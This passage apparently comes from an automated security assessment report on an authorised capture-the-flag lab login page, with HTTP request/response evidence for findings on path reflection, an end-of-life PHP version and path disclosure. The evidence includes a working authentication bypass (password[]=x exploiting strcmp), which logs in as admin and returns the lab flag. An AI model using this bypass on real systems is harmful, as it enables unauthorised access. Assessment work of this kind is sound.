The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) [+1 more URL(s): http://target.local:32839/index.php] @ http://target.local:32839/server-status

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqyo0wsv-1j` — `artifacts/_/ev-mqyo0wsv-1j/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32839

GET /server-statusm7vvg52kv6 HTTP/1.1
Host: target.local:32839
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
Date: Mon, 29 Jun 2026 03:35:23 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 304
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /server-statusm7vvg52kv6 was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

- Evidence `ev-mqyo1siv-1k` — `artifacts/_/ev-mqyo1siv-1k/`

Request:

```http
GET /server-status-benign-baseline HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 310
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:36:35 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /server-status-benign-baseline was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

- Evidence `ev-mqyo1u2k-1l` — `artifacts/_/ev-mqyo1u2k-1l/`

Request:

```http
GET /server-statusUvX9k3rEfLeCt HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 307
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:36:37 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /server-statusUvX9k3rEfLeCt was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

- Evidence `ev-mqyo1vm8-1m` — `artifacts/_/ev-mqyo1vm8-1m/`

Request:

```http
GET /server-statusUvX9k3rEfLeCt HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 307
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:36:39 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /server-statusUvX9k3rEfLeCt was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

<a id="finding-5"></a>

### 5. [MEDIUM] [vulnerable-component] End-of-life PHP 5.6.40 — unsupported since 2018-12-31, no security patches

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32839/

The application leaks its interpreter version via `X-Powered-By: PHP/5.6.40` on every response. PHP 5.6.40 is the FINAL release of the PHP 5.6 branch (Jan 2019); PHP 5.6 reached end-of-life on 2018-12-31 and has received NO security support since. Any PHP vulnerability disclosed after that date is unpatched on this host — e.g. exif heap/OOB issues (CVE-2019-11034, CVE-2019-11035), and the broader class of libgd / phar-deserialization / mbstring memory-corruption bugs fixed only in maintained 7.x/8.x branches. Beyond specific CVEs, running an interpreter that is 7+ years past EOL means unbounded, growing unpatched exposure with no upstream remediation path. The X-Powered-By banner itself is also unnecessary information disclosure (set expose_php=Off). Severity MEDIUM per EOL-without-a-single-universal-RCE; the risk is the cumulative unpatched surface, not one specific exploit. This is a VERSION-BASED finding from the response banner — NOT actively exploited. Remediation: migrate to a supported PHP release (8.x) and disable expose_php.

**Reproduction**

```
1. GET http://target.local:32839/ → 200, response header `X-Powered-By: PHP/5.6.40` (ev-mqynz15x-1g). 2. GET /index.php → 200, same X-Powered-By header (ev-mqynz1vb-1h). 3. Negative control: GET /verdict-nonexistent-9f3a → 404, 304 bytes (ev-mqynz2ny-1i) — distinct status/length. Confirm via the PHP supported-versions page that 5.6 is EOL (2018-12-31) and that 5.6.40 is the last release; review php -v / phpinfo on the host for the real build and whether vendor (Debian) backports apply.
```

**Evidence**

- Evidence `ev-mqynz2ny-1i` — `artifacts/_/ev-mqynz2ny-1i/`

Request:

```http
GET /verdict-nonexistent-9f3a HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 304
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:34:28 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /verdict-nonexistent-9f3a was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

- Evidence `ev-mqynz15x-1g` — `artifacts/_/ev-mqynz15x-1g/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3107
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:34:26 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

- Evidence `ev-mqynz1vb-1h` — `artifacts/_/ev-mqynz1vb-1h/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3107
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:34:27 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

<a id="finding-6"></a>

### 6. [LOW] [info-disclosure] Full path disclosure via verbose PHP errors (display_errors enabled)

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32839/

The application runs PHP 5.6.40 (EOL) with display_errors enabled. Supplying the password parameter as an array (password[]=x) makes strcmp() raise a runtime warning that is rendered directly into the HTTP response, leaking the absolute server-side script path and line number: "Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71". This Full Path Disclosure (CWE-209: Information Exposure Through an Error Message) reveals the web root (/var/www/html) and confirms the exact vulnerable source line, aiding further exploitation. It is a distinct misconfiguration (production display_errors=On) from the password[] authentication-bypass logic flaw recorded separately; any PHP warning on this host would leak paths the same way.

**Reproduction**

```
1. Negative control: GET /index.php?username=MARKER12345&password=wrongpass → 200, 3173 bytes, normal failure page ("Oh Sorry but...you are not the admin"), NO path string (ev-mqynrxmg-11).
2. Positive: GET /index.php?username=admin&password[]=x → 200, 3386 bytes, body contains "Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71" (ev-mqynu3ln-15).
3. Replay: GET /index.php?username=admin&password[]=y → identical 3386-byte response with the same path-disclosure warning (ev-mqynu45j-16).
The absolute path /var/www/html/index.php and source line 71 are exposed only in the array-triggered responses, distinguishing them from the control.
```

**Evidence**

- Evidence `ev-mqynrxmg-11` — `artifacts/s-0005/ev-mqynrxmg-11/`

Request:

```http
GET /index.php?username=MARKER12345&password=wrongpass HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3173
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:28:55 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h3>Oh Sorry but...you are not the admin :( </h3></center></body>
</html>
```

- Evidence `ev-mqynu3ln-15` — `artifacts/s-0005/ev-mqynu3ln-15/`

Request:

```http
GET /index.php?username=admin&password[]=x HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:30:36 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```

- Evidence `ev-mqynu45j-16` — `artifacts/s-0005/ev-mqynu45j-16/`

Request:

```http
GET /index.php?username=admin&password[]=y HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:30:37 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```
